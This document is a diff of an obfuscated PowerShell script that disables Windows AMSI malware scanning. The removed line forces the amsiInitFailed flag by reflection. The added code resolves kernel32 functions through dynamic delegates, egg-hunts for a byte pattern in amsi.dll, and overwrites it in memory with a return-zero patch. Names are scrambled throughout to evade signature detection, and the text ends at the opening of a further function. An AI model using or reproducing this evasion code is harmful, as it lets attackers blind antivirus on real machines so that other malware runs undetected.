@@ -1,4 +1,118 @@
-$aG=$null;$sszsledrh="$(('Sys'+'tem').normAliZE([cHAR]([bYTE]0x46)+[cHaR](10+101)+[CHaR]([ByTE]0x72)+[chAr](109*49/49)+[cHar](43+25)) -replace [ChAR](92)+[ChAR](112)+[ChAr](123+72-72)+[char]([BYTE]0x4d)+[CHaR]([Byte]0x6e)+[cHAR](125)).$(('Mânàgeme'+'nt').NOrMAlizE([CHaR](56+14)+[CHAr](111+60-60)+[ChAr]([BYte]0x72)+[cHar](35+74)+[chAR](68+3-3)) -replace [cHAr](92+65-65)+[ChaR]([BYtE]0x70)+[ChAr](123)+[cHAr](67+10)+[CHar]([ByTe]0x6e)+[cHar](125+41-41)).$([Char](65+21-21)+[chAr]([bYTE]0x75)+[CHar](116+97-97)+[cHAr]([byte]0x6f)+[ChaR](109+96-96)+[CHar](73+24)+[chAR](116)+[chaR]([bYTe]0x69)+[cHaR](111)+[CHaR]([bYTE]0x6e)).$([CHar]([BYTE]0x41)+[char]([BytE]0x6d)+[cHaR](115)+[cHAr](105*100/100)+[chaR](85)+[cHaR](116*13/13)+[ChAR](105*17/17)+[char](32+76)+[ChAr]([ByTE]0x73))";$dlkjyzuxbzperwarmnokkhetyzdfw="+[cHar]([Byte]0x77)+[CHAr]([bYTE]0x69)+[chAr](113)+[chAR]([ByTE]0x73)+[chAR](122+35-35)+[cHAr](117)";[Threading.Thread]::Sleep(312);[Ref].Assembly.GetType($sszsledrh).GetField($(('ãmsìÍnìtFãî'+'led').NorMaLiZE([CHAr](70+66-66)+[char](111+9-9)+[chAR](114*20/20)+[ChAR](109*35/35)+[ChaR]([byte]0x44)) -replace [cHaR]([BYTe]0x5c)+[cHAR](112+80-80)+[chaR](123)+[ChAR]([byte]0x4d)+[CHaR]([bytE]0x6e)+[cHAR](97+28)),"NonPublic,Static").SetValue($aG,$true);
+SET-ItEm  VARiaBLe:vXF2oM  ( [tYPe]("{1}{0}{2}" -f 'ppd','A','OMAiN'));   SET-iTEM  variaBLE:RdPl3  ([typE]("{0}{3}{2}{1}{4}{5}{7}{6}"-f 'SyStem.R','tION.EMIt.ASSemBlybUI','FlEC','E','l','DERAc','SS','ce')  ) ; $1eF=  [Type]("{2}{4}{3}{0}{1}{5}"-f 'LInGCOnV','EN','s','n.cAl','yStEM.reFLECtIo','tioNS');   sEt-iTEm ("va"+"R"+"I"+"aBLe:TNj") ( [tYpE]("{0}{1}"-f'u','Int32'))  ;   Set ('C'+'2iY')  ([tYPE]("{0}{1}{2}" -f 'In','T','ptr'));  $wOzc3= [Type]("{1}{0}" -F 'TeR','HUN') ;    $059  =  [TYPE]("{4}{8}{2}{5}{0}{6}{7}{1}{3}" -f 's','aRsha','Em.RuNTi','L','s','Me.inteRoPSERviCe','.','m','ySt')  ;  Class Hunter {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+        while ($true) {
+            [int]$count = 0
+
+            while ($true) {
+                [IntPtr]$address =  $C2IY::Add($address, 1)
+                If (  (GCI  VariABLE:059).VALUe::ReadByte($address) -eq $egg.Get($count)) {
+                    $count++
+                    If ($count -eq $egg.Length) {
+                        return  $C2IY::Subtract($address, $egg.Length - 1)
+                    }
+                } Else { break }
+            }
+        }
+
+        return $address
+    }
+}
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+
+    
+    $SystemAssembly =  (  VarIAble VxF2om  -valuE  )::CurrentDomain.GetAssemblies() |
+    &("{0}{1}{2}{3}"-f 'Where-','O','bjec','t') { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(("{0}{2}{1}" -f 'Sys','ll','tem.d')) }
+    $UnsafeNativeMethods = $SystemAssembly.GetType(("{1}{4}{3}{0}{5}{7}{2}{8}{9}{6}"-f'.W','M','t','oft','icros','in32.','s','UnsafeNa','iveMeth','od'))
+    
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(("{2}{1}{4}{0}{3}"-f 'a','le','GetModu','ndle','H'))
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod(("{2}{1}{3}{4}{0}" -f's','Proc','Get','A','ddres'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = &("{0}{2}{1}{3}"-f 'New','bje','-O','ct') IntPtr
+    $HandleRef = .("{0}{2}{3}{1}"-f 'Ne','ect','w-Ob','j') System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (.("{1}{0}{2}"-f 'w-Ob','Ne','ject') Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain =   ( VARiaBle vxf2oM -vAlUEoNLy )::CurrentDomain
+    $DynAssembly = .("{1}{0}{2}"-f'bje','New-O','ct') System.Reflection.AssemblyName(("{3}{0}{2}{1}" -f'tedD','gate','ele','Reflec'))
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly,   $RDpl3::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(("{1}{2}{3}{0}"-f 'e','InM','emory','Modul'), $false)
+    $TypeBuilder = $ModuleBuilder.DefineType(("{3}{1}{2}{0}" -f 'Type','a','te','MyDeleg'), ("{11}{7}{1}{0}{4}{10}{8}{3}{9}{12}{6}{2}{5}" -f' Pub','s,','C','siCl','lic, S','lass','uto','as','n','a','ealed, A','Cl','ss, A'), [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor(("{3}{5}{6}{8}{1}{9}{2}{0}{4}{7}"-f', ',',','ySig','RT','Pu','S','pecialN','blic','ame',' HideB'),   $1EF::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags(("{0}{1}{2}{3}{4}" -f 'Run','time, ','Ma','n','aged'))
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', ("{3}{7}{1}{2}{6}{4}{0}{8}{5}" -f'ySig,','li','c, ','Pu','B','l','Hide','b',' NewSlot, Virtua'), $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags(("{1}{4}{3}{2}{0}"-f 'ed','Run','e, Manag','im','t'))
+        
+    .("{1}{2}{0}{3}" -f'Outpu','W','rite-','t') $TypeBuilder.CreateType()
+}
+$LoadLibraryAddr = &("{1}{2}{0}{3}{4}"-f'ocA','Ge','t-Pr','dd','ress') kernel32.dll LoadLibraryA
+$LoadLibraryDelegate = .("{2}{3}{0}{1}"-f'teTyp','e','Get-Dele','ga') @([String]) ([IntPtr])
+$LoadLibrary =   $059::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
+$GetProcAddressAddr = &("{0}{3}{2}{1}" -f'Get','dress','rocAd','-P') kernel32.dll GetProcAddress
+$GetProcAddressDelegate = &("{4}{1}{0}{2}{3}" -f'egat','Del','eTyp','e','Get-') @([IntPtr], [String]) ([IntPtr])
+$GetProcAddress =   (  VaRIaBLE ('0'+'59')  -vAlue )::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
+$VirtualProtectAddr = .("{2}{1}{0}"-f 's','res','Get-ProcAdd') kernel32.dll VirtualProtect
+$VistualProtectDelegate =  &("{1}{0}{2}"-f '-Deleg','Get','ateType') @([IntPtr], [UIntPtr], [UInt32],   ( itEm ("VA"+"r"+"i"+"ABle:Tnj")).VaLue.MakeByRefType()) ([Bool])
+$VirtualProtect =   ( GeT-ChiLdIteM  ("VaRiA"+"Ble:05"+"9")).VaLUE::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)
+
+
+If ( (VaRIABLe  ('C'+'2IY')  -VALUEOnlY)::Size -eq 8) {
+    [byte[]]$egg = [byte[]] (
+        0x4C, 0x8B, 0xDC,       
+        0x49, 0x89, 0x5B, 0x08, 
+        0x49, 0x89, 0x6B, 0x10, 
+        0x49, 0x89, 0x73, 0x18, 
+        0x57,                   
+        0x41, 0x56,             
+        0x41, 0x57,             
+        0x48, 0x83, 0xEC, 0x70  
+    )
+} Else {
+    [byte[]]$egg = [byte[]] (
+        0x8B, 0xFF,             
+        0x55,                   
+        0x8B, 0xEC,             
+        0x83, 0xEC, 0x18,       
+        0x53,                   
+        0x56                    
+    )
+}
+
+
+$hModule = $LoadLibrary.Invoke(("{1}{2}{0}" -f'l','amsi.d','l'))
+$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, ("{0}{1}{3}{5}{4}{2}" -f'D','l','t','lGet','c','ClassObje'))
+[IntPtr]$targetedAddress =  (  ITeM  VariABle:wozC3 ).VaLuE::FindAddress($DllGetClassObjectAddress, $egg)
+
+$oldProtectionBuffer = 0
+$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | .("{2}{0}{1}"-f 'ut-N','ull','O')
+
+$patch = [byte[]] (
+    0x31, 0xC0,    
+    0xC3           
+)
+ ( ChiLDItem ("v"+"aRI"+"ABLE:"+"059")  ).VaLUE::Copy($patch, 0, $targetedAddress, 3)
+
+$a = 0
+$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | &("{0}{1}{2}" -f'O','u','t-Null')
 
 
 function LookupFunc {
